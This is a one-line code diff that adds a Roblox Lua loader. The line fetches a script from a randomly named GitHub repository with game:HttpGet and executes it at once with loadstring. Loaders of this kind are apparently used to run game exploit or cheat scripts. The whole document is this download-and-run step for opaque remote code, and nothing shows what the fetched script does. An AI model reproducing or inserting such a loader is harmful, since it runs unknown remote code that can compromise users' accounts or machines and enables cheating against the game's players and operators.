@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/discopro/34w45u983456y09i4e5tiofgnbm9uie5h698nrt896/main/cum.lua'))()
